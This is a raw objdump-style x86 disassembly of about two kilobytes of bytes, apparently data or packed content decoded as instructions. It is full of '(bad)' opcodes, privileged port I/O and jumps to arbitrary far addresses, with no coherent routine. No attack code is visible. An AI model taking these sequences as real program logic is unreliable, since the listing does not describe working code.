  4021d8:	xchg   BYTE PTR [eax+0x7f],al
  4021db:	or     al,0x62
  4021dd:	loop   0x402184
  4021df:	shl    BYTE PTR [esi],cl
  4021e1:	sub    esi,DWORD PTR [ebx-0x41]
  4021e4:	fsub   DWORD PTR [esi]
  4021e6:	and    eax,DWORD PTR [eax+edx*1]
  4021e9:	mov    esp,0xdc75f6f9
  4021ee:	repz sbb al,0x23
  4021f1:	shr    DWORD PTR [esi-0x5cb7b831],1
  4021f7:	push   es
  4021f8:	mov    al,ds:0x551fa993
  4021fe:	push   es
  4021ff:	rol    BYTE PTR [edx+0x2],0xb0
  402203:	and    DWORD PTR [eax+0x144104ca],0x16
  40220a:	lods   al,BYTE PTR ds:[esi]
  40220b:	inc    edx
  40220c:	stos   BYTE PTR es:[edi],al
  40220d:	dec    eax
  40220e:	add    edx,ecx
  402210:	pushf  
  402211:	mov    ds:0xd651d454,al
  402216:	xor    DWORD PTR [esi+eax*1],esi
  402219:	rol    DWORD PTR [eax-0x8beec5],cl
  40221f:	and    BYTE PTR [eax-0x55c56a7a],dh
  402225:	jg     0x402282
  402227:	out    0xbb,eax
  402229:	sub    ch,ah
  40222b:	cmp    DWORD PTR [ebp-0x33],edi
  40222e:	push   0xffffff83
  402230:	push   0x5e
  402232:	jb     0x402228
  402234:	out    0xf,eax
  402236:	adc    eax,0x4710bc31
  40223b:	shr    dh,1
  40223d:	stos   DWORD PTR es:[edi],eax
  40223e:	sub    DWORD PTR [ebx+0xe],ebx
  402241:	call   0x9d34:0x3e7ff119
  402248:	test   eax,0x872f41dd
  40224d:	outs   dx,BYTE PTR ds:[esi]
  40224e:	cmp    al,0x58
  402250:	push   cs
  402251:	sub    al,0x92
  402253:	push   ds
  402254:	xchg   edx,eax
  402255:	pusha  
  402256:	cmp    dl,BYTE PTR ds:0x5e132ba3
  40225c:	jne    0x402209
  40225e:	push   ss
  40225f:	iret   
  402260:	mov    dh,0x32
  402262:	fimul  WORD PTR [edi+0x181f6146]
  402268:	jnp    0x4022e5
  40226a:	xchg   edx,eax
  40226b:	rol    BYTE PTR [eax],0x80
  40226e:	cmp    eax,0x2e0817fb
  402273:	test   BYTE PTR [ecx],dl
  402275:	cli    
  402276:	xchg   ecx,eax
  402277:	sub    al,BYTE PTR [esi]
  402279:	ret    0x3ee9
  40227c:	pop    ebp
  40227d:	aas    
  40227e:	int    0x79
  402280:	psubb  mm5,QWORD PTR [ebp*1+0x154be15e]
  402288:	and    esi,ebx
  40228a:	push   edi
  40228b:	daa    
  40228c:	sbb    edx,DWORD PTR [edi+0x68]
  40228f:	in     eax,dx
  402290:	push   ebp
  402291:	and    al,0x32
  402293:	test   eax,0x5511c01a
  402298:	or     DWORD PTR [edx+eax*8],0xffffff9b
  40229c:	pop    ebp
  40229d:	aam    0x38
  40229f:	arpl   bx,di
  4022a1:	sbb    eax,0x92dd9f15
  4022a6:	sti    
  4022a7:	bswap  edx
  4022a9:	push   esp
  4022aa:	xchg   edx,eax
  4022ab:	cmp    BYTE PTR [ebp-0x4de06ed1],0xf2
  4022b2:	xor    BYTE PTR [eax-0x52],0x35
  4022b6:	xlat   BYTE PTR ds:[ebx]
  4022b7:	push   0x7f
  4022b9:	jbe    0x40223b
  4022bb:	mov    bl,0xd2
  4022bd:	xchg   esi,eax
  4022be:	int3   
  4022bf:	in     eax,dx
  4022c0:	dec    ebp
  4022c1:	sbb    al,0x35
  4022c3:	add    BYTE PTR [eax-0x37],bl
  4022c6:	cld    
  4022c7:	add    ah,dl
  4022c9:	je     0x402315
  4022cb:	cli    
  4022cc:	imul   ebx,DWORD PTR [ebx-0x70],0xc9f2971f
  4022d3:	dec    esi
  4022d4:	cmc    
  4022d5:	inc    edi
  4022d6:	test   ecx,ebx
  4022d8:	retf   
  4022d9:	pop    esp
  4022da:	mov    bl,0x4e
  4022dc:	shl    BYTE PTR [esi-0x2a104cf5],0x26
  4022e3:	pusha  
  4022e4:	(bad)  
  4022e5:	dec    ebx
  4022e6:	push   esi
  4022e7:	test   BYTE PTR [edi+0x2d],bl
  4022ea:	popa   
  4022eb:	jns    0x40230a
  4022ed:	stc    
  4022ee:	jns    0x402314
  4022f0:	push   ecx
  4022f1:	or     al,0xe7
  4022f3:	inc    eax
  4022f4:	div    DWORD PTR [edi-0x4c]
  4022f7:	pop    ebx
  4022f8:	(bad)  
  4022f9:	push   0x4496787e
  4022fe:	(bad)  
  4022ff:	mov    WORD PTR [eax+0x11],fs
  402302:	in     eax,0xa1
  402304:	pop    ecx
  402305:	int    0xb7
  402307:	dec    edi
  402308:	scas   eax,DWORD PTR es:[edi]
  402309:	mov    ds:0xbdeedbd,al
  40230e:	imul   edx,DWORD PTR [edi+0x70fad19b],0x6a
  402315:	push   cs
  402316:	and    al,0xb0
  402318:	addr16 ret 0x1008
  40231c:	scas   eax,DWORD PTR es:[edi]
  40231d:	mov    BYTE PTR [esp+edi*2+0xb217a5d],ah
  402324:	lock pushf 
  402326:	stos   DWORD PTR es:[edi],eax
  402327:	ror    DWORD PTR ds:0x7f3ef00c,cl
  40232d:	popa   
  40232e:	jns    0x402316
  402330:	cmovs  edi,ebp
  402333:	jle    0x402324
  402335:	mov    WORD PTR [ecx-0x7cf8b7ee],ss
  40233b:	mov    DWORD PTR ss:[eax+eax*1-0x32a411f4],esp
  402343:	mov    ebx,0xcba8e54f
  402348:	fcmovbe st,st(0)
  40234a:	jmp    0x853c9923
  40234f:	ins    DWORD PTR es:[edi],dx
  402350:	or     eax,0xd4a9e0ea
  402355:	call   0x9d2bc19c
  40235a:	in     al,0xd9
  40235c:	xchg   ebx,eax
  40235d:	inc    esp
  40235e:	ja     0x40230d
  402360:	pop    es
  402361:	test   al,0x11
  402363:	(bad)  
  402364:	xchg   ecx,eax
  402365:	pop    ebp
  402366:	sahf   
  402367:	lahf   
  402368:	push   cs
  402369:	mov    ch,0xbd
  40236b:	adc    eax,0x9db07684
  402370:	(bad)  
  402371:	cmp    ecx,DWORD PTR [eax]
  402373:	xchg   edx,eax
  402374:	aaa    
  402375:	aad    0xa0
  402377:	sbb    ebx,esi
  402379:	push   ebx
  40237a:	sub    al,0xef
  40237c:	dec    BYTE PTR [edi-0x1ef63d19]
  402382:	add    eax,0x266a51d3
  402387:	(bad)  
  402388:	call   0x121e59f4
  40238d:	cmp    eax,0x690372fe
  402392:	sbb    DWORD PTR [esi+0x65eed743],ebx
  402398:	dec    ecx
  402399:	rcr    cl,0xf5
  40239c:	lods   al,BYTE PTR ds:[esi]
  40239d:	jg     0x402377
  40239f:	sbb    esi,esi
  4023a1:	mov    al,0x1f
  4023a3:	dec    ecx
  4023a4:	(bad)
  4023a8:	fld    QWORD PTR [edi+eax*4]
  4023ab:	outs   dx,DWORD PTR gs:[esi]
  4023ad:	test   bh,bl
  4023af:	shr    bl,0x86
  4023b2:	xor    eax,DWORD PTR [edi-0x265babc2]
  4023b8:	sbb    edx,0xf7725081
  4023be:	(bad)  
  4023c0:	dec    edx
  4023c1:	push   ecx
  4023c2:	adc    edi,DWORD PTR [esi+0x78]
  4023c5:	pop    ebx
  4023c6:	jbe    0x402440
  4023c8:	aaa    
  4023c9:	pop    eax
  4023ca:	bound  ecx,QWORD PTR [eax-0x441e8f43]
  4023d0:	push   cs
  4023d1:	test   al,0xb8
  4023d3:	cmc    
  4023d4:	(bad)  
  4023d5:	sub    al,0xc3
  4023d7:	and    DWORD PTR [ecx+0x4642f197],esp
  4023dd:	out    0xbf,al
  4023df:	ins    DWORD PTR es:[edi],dx
  4023e0:	jle    0x402429
  4023e2:	ins    BYTE PTR es:[edi],dx
  4023e3:	pop    ss
  4023e4:	mov    al,0xbe
  4023e6:	cmp    DWORD PTR ds:0xaca24c68,edx
  4023ec:	dec    ecx
  4023ed:	or     BYTE PTR [ecx+0x23],dh
  4023f0:	xor    BYTE PTR [edx-0x4e],0x3c
  4023f4:	pop    edx
  4023f5:	pop    eax
  4023f6:	inc    esp
  4023f7:	mov    WORD PTR [eax],es
  4023f9:	mov    bh,0x71
  4023fb:	jne    0x4023d2
  4023fd:	mov    ds:0xe1d4bb01,al
  402402:	inc    ebp
  402403:	pushf  
  402404:	retf   
  402405:	aas    
  402406:	and    al,0x28
  402408:	imul   ebx,edi,0xffffffae
  40240b:	sbb    DWORD PTR [esi+0x6fba8bbd],ebp
  402411:	fs inc ecx
  402413:	sahf   
  402414:	jmp    0xe44cb6a9
  402419:	mov    WORD PTR [ecx+0x5b265766],ds
  40241f:	aaa    
  402420:	pop    es
  402421:	xor    DWORD PTR [ecx+0x3dc9fc71],ecx
  402427:	mov    bh,0xc
  402429:	jne    0x402416
  40242b:	inc    BYTE PTR [ebp+0xf539d68]
  402431:	inc    edi
  402432:	xor    al,0x1f
  402434:	xchg   edx,eax
  402435:	adc    BYTE PTR [ebx],cl
  402437:	jmp    0xe2ad037
  40243c:	xchg   BYTE PTR [ecx],dl
  40243e:	or     bl,dh
  402440:	lds    esi,FWORD PTR [eax]
  402442:	or     DWORD PTR [ebx-0x4],esp
  402445:	push   cs
  402446:	mov    DWORD PTR [edx+esi*8],ebx
  402449:	mov    ecx,0xbb945403
  40244e:	or     DWORD PTR [esi+0x57],0xb7e96aee
  402455:	in     eax,0x9a
  402457:	sub    al,0xf4
  402459:	xor    eax,0x54b06690
  40245e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40245f:	sub    ebp,ebx
  402461:	loope  0x40245b
  402463:	and    esp,DWORD PTR [ebx+0x1c]
  402466:	jg     0x402464
  402468:	mov    ds:0xebb3971e,al
  40246d:	cwde   
  40246e:	fwait
  40246f:	add    esp,DWORD PTR [esi]
  402471:	mov    ds:0xcd7a4be5,eax
  402476:	or     eax,0xd3cfa96f
  40247b:	fs pushw 0x53
  40247f:	and    cl,al
  402481:	dec    ebp
  402482:	sub    BYTE PTR [edi],dh
  402484:	jbe    0x40241c
  402486:	or     DWORD PTR [edi],edi
  402488:	out    dx,al
  402489:	fs mov dh,0xde
  40248c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40248d:	mov    cl,0xd4
  40248f:	inc    edx
  402490:	pop    eax
  402491:	aaa    
  402492:	mov    edi,0xe2e87b2f
  402497:	jp     0x40243e
  402499:	adc    DWORD PTR [edx+edi*8],ecx
  40249c:	cmp    ebx,DWORD PTR [esi+ebx*8]
  40249f:	std    
  4024a0:	fdivr  DWORD PTR [esi+0x36dee7ac]
  4024a6:	xor    BYTE PTR ds:0xf761a4a4,dl
  4024ac:	call   0x4246:0x94d49db1
  4024b3:	addr16 in eax,0xc1
  4024b6:	hlt    
  4024b7:	jge    0x4024bb
  4024b9:	idiv   DWORD PTR [esi-0x7b194d4c]
  4024bf:	mov    ds:0x2531747d,eax
  4024c4:	mov    esi,0xc6028512
  4024c9:	cs and bh,bl
  4024cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024cd:	push   ecx
  4024ce:	push   ebx
  4024cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024d0:	and    al,0xae
  4024d2:	jno    0x40248c
  4024d4:	mov    esi,0x9a325641
  4024da:	das    
  4024db:	sub    BYTE PTR [ebp-0x1f],0x45
  4024df:	xor    eax,0x76196d2
  4024e4:	ret    
  4024e5:	jne    0x4024b0
  4024e7:	push   ss
  4024e8:	jb     0x402507
  4024ea:	dec    esp
  4024eb:	push   ecx
  4024ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024ed:	and    ah,ah
  4024ef:	jae    0x4024d3
  4024f1:	xor    ecx,0x8c9c4717
  4024f7:	bound  edi,QWORD PTR [ebx+0x11]
  4024fa:	sub    BYTE PTR [eax+0x10c56a85],bl
  402500:	sar    ah,cl
  402502:	jecxz  0x40249a
  402504:	daa    
  402505:	sub    DWORD PTR [esi+eiz*2],ebp
  402508:	jmp    FWORD PTR [edi-0x12]
  40250b:	dec    ecx
  40250c:	scas   eax,DWORD PTR es:[edi]
  40250d:	xlat   BYTE PTR ds:[ebx]
  40250e:	retf   0x438a
  402511:	std    
  402512:	clc    
  402513:	test   DWORD PTR [ebp+0x9be2a80],ebp
  402519:	inc    DWORD PTR [esi+eiz*8-0x18]
  40251d:	lock push edx
  40251f:	loope  0x402547
  402521:	adc    al,0x1
  402523:	inc    ebx
  402524:	js     0x40255c
  402526:	les    edi,FWORD PTR [eax+0x1b]
  402529:	fidivr WORD PTR [ebp+0x15f48df9]
  40252f:	lods   al,BYTE PTR ds:[esi]
  402530:	sub    DWORD PTR [ecx-0x61],0x1f7f2176
  402537:	les    ecx,FWORD PTR [esi+0x44782e78]
  40253d:	sahf   
  40253e:	and    al,0x95
  402540:	add    ch,BYTE PTR [edx+0x5ce2d36e]
  402546:	or     ecx,DWORD PTR [eax-0x60]
  402549:	enter  0xd843,0x5e
  40254d:	in     eax,dx
  40254e:	adc    DWORD PTR [edx+0x28],esi
  402551:	cmp    DWORD PTR [ecx],ebx
  402553:	enter  0x774e,0xb8
  402557:	or     BYTE PTR [edx-0x8],0x57
  40255b:	(bad)  
  40255c:	cwde   
  40255d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40255e:	mov    edi,0x8868b396
  402563:	dec    ebx
  402564:	xor    eax,0x49671be3
  402569:	pop    eax
  40256a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40256b:	push   edx
  40256c:	sub    ah,BYTE PTR [esi]
  40256e:	sbb    DWORD PTR [eax],0x48
  402571:	and    DWORD PTR [edx],0xd
  402574:	add    DWORD PTR [edx-0x19],ebx
  402577:	cmp    DWORD PTR [edi-0x46],0x3057e598
  40257e:	jl     0x4025d5
  402580:	mov    ds:0xc1f2eab6,al
  402585:	xor    bl,0x35
  402588:	dec    ebx
  402589:	mov    edx,eax
  40258b:	leave  
  40258c:	gs xchg esi,esp
  40258f:	rcl    DWORD PTR [ecx-0x3f0ac3fc],cl
  402595:	xor    DWORD PTR [esi+0x224c5102],ebx
  40259b:	cld    
  40259c:	popa   
  40259d:	retf   0x9e7f
  4025a0:	ret    0x611d
  4025a3:	or     ecx,DWORD PTR [ebp+eax*2-0x62e22d03]
  4025aa:	or     cl,0x0
  4025ad:	loop   0x40259a
  4025af:	inc    esi
  4025b0:	add    al,0x38
  4025b3:	pop    ebx
  4025b4:	cmc    
  4025b5:	push   eax
  4025b6:	out    dx,eax
  4025b7:	je     0x4025da
  4025b9:	nop
  4025ba:	ret    
  4025bb:	pop    edx
  4025bc:	jmp    FWORD PTR [edx]
  4025be:	xchg   ecx,eax
  4025bf:	sub    esp,DWORD PTR [ebp+0x1d208381]
  4025c5:	mov    ah,0x6a
  4025c7:	xchg   esp,eax
  4025c8:	fisttp QWORD PTR [esi]
  4025ca:	(bad)  
  4025cb:	and    DWORD PTR [ebx],edi
  4025cd:	daa    
  4025ce:	dec    DWORD PTR [edx+edx*2]
  4025d1:	mov    bh,0x92
  4025d3:	inc    eax
  4025d4:	pop    ebx
  4025d5:	xor    ecx,ecx
  4025d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025d8:	not    BYTE PTR gs:[edx-0x53]
  4025dc:	pop    edi
  4025dd:	push   ss
  4025de:	sahf   
  4025df:	addr16 dec eax
  4025e1:	dec    edx
  4025e2:	das    
  4025e3:	and    ebx,DWORD PTR [ebx-0x75]
  4025e6:	(bad)  
  4025e7:	cld    
  4025e8:	mov    ds:0xcfac598b,al
  4025ed:	push   cs
  4025ee:	sbb    esp,edi
  4025f0:	int    0x1c
  4025f2:	sub    BYTE PTR [edx+0x1e13778c],ah
  4025f8:	sub    al,0x9c
  4025fa:	stos   BYTE PTR es:[edi],al
  4025fb:	(bad)  
  4025fc:	and    eax,0x28312c23
  402601:	pop    ebp
  402602:	mov    bl,0xbf
  402604:	je     0x4025ed
  402606:	jge    0x4025ef
  402608:	pop    edx
  402609:	lds    ebx,FWORD PTR [ecx+0x5fc7de67]
  40260f:	cmc    
  402610:	lds    edx,FWORD PTR [eax]
  402612:	jmp    0x1848:0xfa24b7e2
  402619:	sqrtps xmm3,XMMWORD PTR [edx+0x231f3ebc]
  402620:	jmp    0x4025d8
  402622:	jno    0x4025c1
  402624:	or     eax,0x4ce7a04b
  402629:	dec    ebx
  40262a:	mov    ecx,DWORD PTR [esi]
  40262c:	enter  0x311f,0x94
  402630:	adc    DWORD PTR [edi],esp
  402632:	or     DWORD PTR [ecx+0x45],esi
  402635:	sub    ecx,DWORD PTR [ecx+0x67]
  402638:	lahf   
  402639:	xor    DWORD PTR [ebp+0x4a],0xffffff91
  40263d:	push   0x23
  40263f:	push   ss
  402640:	imul   ebx,DWORD PTR [esi+edi*4+0xc],0xf4cdc87e
  402648:	dec    edi
  402649:	dec    ecx
  40264a:	(bad)  
  40264b:	stos   DWORD PTR es:[edi],eax
  40264c:	pushf  
  40264d:	jbe    0x402682
  40264f:	mov    ebx,edx
  402651:	inc    edx
  402652:	add    esp,0x35107bbd
  402658:	jge    0x4025ff
  40265a:	(bad)  
  40265b:	mov    eax,ds:0x870c654
  402660:	ins    DWORD PTR es:[edi],dx
  402661:	sbb    DWORD PTR ds:0x7b3bda6b,eax
  402667:	daa    
  402668:	cmc    
  402669:	or     BYTE PTR [edx],0x6
  40266c:	div    DWORD PTR [esi-0x3aeec657]
  402672:	xor    al,0x5d
  402674:	cld    
  402675:	mov    fs,WORD PTR ds:0xab733187
  40267b:	adc    DWORD PTR [ecx],ecx
  40267d:	push   esp
  40267e:	outs   dx,BYTE PTR ds:[esi]
  40267f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402680:	call   0xcc2286a1
  402685:	adc    bl,BYTE PTR [esi-0x21]
  402688:	cmp    eax,0xc07e107e
  40268d:	jecxz  0x402693
  40268f:	adc    BYTE PTR [ebx-0x6e],bl
  402692:	clc    
  402693:	stos   BYTE PTR es:[edi],al
  402694:	mov    gs,ebp
  402696:	lods   eax,DWORD PTR ds:[esi]
  402697:	inc    edi
  402698:	adc    ecx,ebp
  40269a:	fcmovnb st,st(4)
  40269c:	bound  ebx,QWORD PTR [eax]
  40269e:	rcr    BYTE PTR [ecx+eax*1-0x5e],1
  4026a2:	mul    ch
  4026a4:	aad    0x82
  4026a6:	and    dl,ah
  4026a8:	je     0x40262a
  4026aa:	add    BYTE PTR [edi+0x66],0xeb
  4026ae:	push   ecx
  4026af:	push   edx
  4026b0:	jmp    0xb469:0xdbabf43
  4026b7:	or     bl,BYTE PTR [ebx+0x6ae95a72]
  4026bd:	jmp    0x428686d1
  4026c2:	push   0xbbe48a5b
  4026c7:	fistp  WORD PTR [edi-0x61]
  4026cb:	(bad)  
  4026cc:	dec    ebx
  4026cd:	jge    0x4026e5
  4026cf:	(bad)  
  4026d0:	add    BYTE PTR [ebp-0x59],ah
  4026d3:	sub    al,0x43
  4026d5:	(bad)  
  4026d6:	push   eax
  4026d7:	jo     0x4026d1
  4026d9:	push   cs
  4026da:	sbb    edx,DWORD PTR [ebp+0x10]
  4026dd:	push   es
  4026de:	jb     0x4026ee
  4026e0:	cmp    ebp,DWORD PTR [edi+0x30c87075]
  4026e6:	jnp    0x402679
  4026e8:	jae    0x4026ad
  4026ea:	or     cl,dl
  4026ec:	cld    
  4026ed:	adc    bl,bl
  4026ef:	dec    esi
  4026f0:	push   esi
  4026f1:	push   cs
  4026f2:	jle    0x402707
  4026f4:	leave  
  4026f5:	xlat   BYTE PTR ds:[ebx]
  4026f6:	pop    ebx
  4026f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026f8:	and    bh,bh
  4026fa:	or     eax,0x2e351c89
  4026ff:	dec    ebx
  402700:	cdq    
  402701:	data16 sub dh,BYTE PTR [ecx-0x77]
  402705:	inc    edi
  402706:	adc    esi,ebp
  402708:	push   0x609ca1c6
  40270d:	and    BYTE PTR [ebx+0x61e9e30c],dh
  402713:	mov    bh,BYTE PTR [eax]
  402715:	data16 xor al,0xf9
  402718:	xlat   BYTE PTR ds:[ebx]
  402719:	call   0xb89b:0x5fc623cd
  402720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402721:	sti    
  402722:	aas    
  402723:	and    al,0x3e
  402725:	jl     0x402746
  402727:	sub    esi,esp
  402729:	fldenv [ebp-0xf9b3f50]
  40272f:	xor    eax,0xa9f726d2
  402734:	out    0x2c,al
  402736:	clc    
  402737:	push   0xffffff9e
  402739:	in     al,0x28
  40273b:	sub    edi,esi
  40273d:	push   esp
  40273e:	dec    eax
  40273f:	daa    
  402740:	nop
  402741:	out    dx,al
  402742:	pop    ebp
  402743:	ins    DWORD PTR es:[edi],dx
  402744:	mov    eax,ds:0x6b19d247
  402749:	jecxz  0x4026e0
  40274b:	sbb    edi,DWORD PTR [ecx-0x4f52d527]
  402751:	adc    BYTE PTR [ebx+0x7ab3d54b],bl
  402757:	in     eax,0x95
  402759:	mov    eax,ds:0x69896120
  40275e:	xchg   BYTE PTR [esi-0x1ac50328],ch
  402764:	repnz shl BYTE PTR [ebx+0x65],1
  402768:	sti    
  402769:	sub    bl,bl
  40276b:	inc    ebp
  40276c:	imul   edi,DWORD PTR [ecx-0x4c0cdc16],0xffffffbf
  402773:	mov    edi,0xf12ab62b
  402778:	jmp    0x942a:0xac23348
  40277f:	(bad)  
  402780:	or     BYTE PTR [edx-0x31b7dbbc],al
  402786:	ss pop ds
  402788:	pop    esp
  402789:	push   esp
  40278a:	jbe    0x4027bb
  40278c:	ret    0x9cca
  40278f:	in     al,0x60
  402791:	add    BYTE PTR [eax-0x59],dh
  402794:	mov    WORD PTR [ebx+0x4f273b5a],cs
  40279a:	inc    ebp
  40279b:	dec    esi
  40279c:	dec    eax
  40279d:	or     esi,edi
  40279f:	sub    al,0x3f
  4027a1:	js     0x402821
  4027a3:	loope  0x402811
  4027a5:	and    eax,0x621a8f5c
  4027aa:	adc    eax,0xda281081
  4027af:	sahf   
  4027b0:	push   0xb79063fe
  4027b5:	pop    eax
  4027b6:	fs jge 0x402776
  4027b9:	cwde   
  4027ba:	pop    ds
  4027bb:	int3   
  4027bc:	dec    eax
  4027bd:	dec    BYTE PTR [ebp+ecx*8-0x53724d6a]
  4027c4:	mov    bh,BYTE PTR [ecx+0x323fbd55]
  4027ca:	and    esi,DWORD PTR ds:0xfa5cc988
  4027d0:	cld    
  4027d1:	xor    eax,edi
  4027d3:	sub    BYTE PTR [ebx+0x632e3c18],ch
  4027d9:	out    0x1a,al
  4027db:	cmp    BYTE PTR [esp+ebx*4],bl
  4027de:	cli    
  4027df:	jne    0x4027c9
  4027e1:	mov    al,0xd9
  4027e3:	ds jl  0x402794
  4027e6:	xchg   ebx,eax
  4027e7:	mov    DWORD PTR [esi],esp
  4027e9:	jl     0x4027ae
  4027eb:	jns    0x402830
  4027ed:	push   esi
  4027ee:	add    esi,DWORD PTR [edx+0x6be0f6e8]
  4027f4:	(bad)  
  4027f5:	aad    0xc8
  4027f7:	out    dx,eax
  4027f8:	and    eax,0xb8a6450
  4027fd:	imul   eax,DWORD PTR [edi],0xfffffffd
  402800:	cs cli 
  402802:	xlat   BYTE PTR ds:[ebx]
  402803:	xchg   al,bh
  402805:	mov    fs,WORD PTR [eax-0x3cfe4b40]
  40280b:	out    dx,eax
  40280c:	rcr    BYTE PTR ds:0x335cde26,0x6f
  402813:	or     eax,0xd0300368
  402818:	sbb    eax,0xad2cc7da
  40281d:	mov    cl,0x4b
  40281f:	pop    ds
  402820:	aaa    
  402821:	fiadd  WORD PTR ds:0x59616876
  402827:	inc    esi
  402828:	dec    ebp
  402829:	sbb    DWORD PTR [ebp+0x1363064],0x3b
  402830:	mov    edx,DWORD PTR [ebx+0x33681c89]
  402836:	retf   
  402837:	mov    ebx,0x57714a2
  40283c:	cmp    BYTE PTR [ebx+0x65dd32b3],al
  402842:	adc    al,ch
  402844:	jae    0x4028bd
  402846:	lea    edi,[ebp-0x35]
  402849:	aam    0x8b
  40284b:	dec    esi
  40284c:	in     al,dx
  40284d:	jne    0x40289d
  40284f:	into   
  402850:	and    al,BYTE PTR [ebx-0x11]
  402853:	xchg   ebx,ecx
  402855:	je     0x4028a0
  402857:	nop
  402858:	sahf   
  402859:	sub    ebx,DWORD PTR [eax]
  40285b:	or     eax,0x8e5aa5d8
  402860:	mov    dh,0x1e
  402862:	repz test al,0xeb
  402865:	xor    al,0x95
  402867:	pop    es
  402868:	pop    eax
  402869:	sbb    eax,0x4de30677
  40286e:	(bad)  
  402870:	mov    eax,ds:0xe6f08904
  402875:	(bad)  
  402876:	fidiv  WORD PTR ds:0x5b13728b
  40287c:	jle    0x402812
  40287e:	fidiv  DWORD PTR [eax-0x3f]
  402881:	pop    edi
  402882:	pop    ecx
  402883:	xchg   ebx,eax
  402884:	icebp  
  402885:	sbb    BYTE PTR [ebx+0x12bbe6b6],ah
  40288b:	sub    eax,0xee4b096b
  402890:	xor    al,0x69
  402892:	sti    
  402893:	(bad)
  402897:	rcl    al,0x60
  40289a:	xchg   edi,eax
  40289b:	in     al,0x8e
  40289d:	scas   al,BYTE PTR es:[edi]
  40289e:	adc    DWORD PTR [esp+ebx*2+0x2],0x87676a45
  4028a6:	push   ss
  4028a7:	xor    cl,ch
  4028a9:	sbb    BYTE PTR [edx-0x19],ah
  4028ac:	imul   BYTE PTR [edi+0x12d6aedf]
  4028b2:	xchg   edx,eax
  4028b3:	outs   dx,DWORD PTR ds:[si]
  4028b5:	cmp    ebx,esi
  4028b7:	sub    esp,DWORD PTR gs:[edx]
  4028ba:	enter  0x5df7,0x32
  4028be:	and    esp,DWORD PTR [esi+0x15]
  4028c1:	sbb    eax,0x203a91a7
  4028c6:	pop    ebp
  4028c7:	sbb    DWORD PTR cs:0x19f107dd,esi
  4028ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028cf:	mov    eax,0xb52abd36
  4028d4:	addr16 inc edi
  4028d6:	fld    DWORD PTR [ebx]
  4028d8:	ds test eax,0x258cf741
  4028de:	xlat   BYTE PTR ds:[ebx]
  4028df:	sar    bl,cl
  4028e1:	fstp   DWORD PTR [ebp+0x68]
  4028e4:	mov    ebx,0x6236c77d
  4028e9:	(bad)  
  4028eb:	cmp    eax,DWORD PTR [ebp-0xc4b799d]
  4028f1:	mov    eax,DWORD PTR [ebx-0x6d]
  4028f4:	mov    dh,0x33
  4028f6:	inc    esi
  4028f7:	int    0xbd
  4028f9:	pop    ebx
  4028fa:	shr    BYTE PTR [ebx-0x44898345],0x97
  402901:	loopne 0x4028c6
  402903:	sub    BYTE PTR [eax-0x63490249],0xa1
  40290a:	xor    DWORD PTR [ecx-0xf270db4],esp
  402910:	add    BYTE PTR [eax-0x6d4a41f3],dl
  402916:	mov    BYTE PTR [ebp-0x4b],dh
  402919:	jns    0x4028de
  40291b:	adc    dl,BYTE PTR [ebx+0x3e79e07b]
  402921:	mov    eax,?
  402923:	inc    eax
  402924:	or     DWORD PTR [esi-0x44],eax
  402927:	clc    
  402928:	int3   
  402929:	push   edi
  40292a:	jae    0x4028b1
  40292c:	leave  
  40292d:	stos   DWORD PTR es:[edi],eax
  40292e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40292f:	fwait
  402930:	imul   esi,DWORD PTR [edx+0x29],0xffffffac
  402934:	jns    0x4028e7
  402936:	xchg   DWORD PTR [edi-0x9ea20f9],edx
  40293c:	or     bl,BYTE PTR [ebp+0x2e]
  40293f:	hlt    
  402940:	test   ebx,ebx
  402942:	sub    edi,eax
  402944:	into   
  402945:	fimul  DWORD PTR [ebp+0xcf1e5f1]
  40294b:	mov    ecx,0x1c2a44b2
  402950:	pop    ebx
  402951:	sub    BYTE PTR [ebx-0xe],al
  402954:	popf   
  402955:	adc    BYTE PTR [ecx],0xf1
  402958:	and    eax,0xb9812fd7
  40295d:	es push 0x51
  402960:	sub    ecx,0x67
  402963:	sub    DWORD PTR [ecx+0x75faccaf],ebp
  402969:	outs   dx,BYTE PTR ds:[esi]
  40296a:	imul   edx,ecx,0x0
  40296d:	push   0xffffffd9
  40296f:	adc    al,BYTE PTR [edx+0x66]
  402972:	push   cs
  402973:	scas   al,BYTE PTR es:[edi]
  402974:	mov    ds:0x36db3bbc,al
  402979:	jge    0x40294e
  40297b:	pushf  
  40297c:	(bad)  
  40297d:	call   FWORD PTR [ecx+ebx*8]
  402980:	into   
  402981:	inc    ebp
  402982:	out    0xf1,al
  402984:	sub    al,0xe6
  402986:	sbb    DWORD PTR [eax+edi*4-0x3e17a2d0],0xd51d529d
  402991:	rcl    DWORD PTR [ecx-0x7a3be4df],0x3
  402998:	repnz imul edx,DWORD PTR [eax],0x25f6da8f
  40299f:	ins    BYTE PTR es:[edi],dx
  4029a0:	adc    eax,0x55f0190c
  4029a5:	mov    dh,0xfc
  4029a7:	loopne 0x402956
  4029a9:	rcl    BYTE PTR [ebx+0x65],0xb4
  4029ad:	inc    ebx
  4029ae:	add    al,0x73
  4029b1:	test   BYTE PTR [edi+0x7ecfb60f],al
  4029b7:	pop    ss
  4029b8:	adc    dl,BYTE PTR [edx-0x76c9a79b]
  4029be:	idiv   DWORD PTR [ebp-0x52]
  4029c1:	and    DWORD PTR cs:[ecx],esp
  4029c4:	cmp    ch,BYTE PTR [eax-0x4852356]
  4029ca:	and    eax,0x9ea4996d
  4029cf:	xlat   BYTE PTR ds:[ebx]
  4029d0:	ficomp WORD PTR [ecx+0x50]
  4029d3:	inc    ebp
  4029d4:	push   ds
  4029d5:	push   0xcc3fb94b
  4029da:	push   ss
  4029db:	pushf  
  4029dc:	fsubr  st,st(4)
  4029de:	mov    eax,0x2e3bad84
  4029e3:	mov    bh,0xb7
  4029e5:	ficomp WORD PTR [eax-0x24]
  4029e8:	adc    DWORD PTR [ecx-0x2d],eax
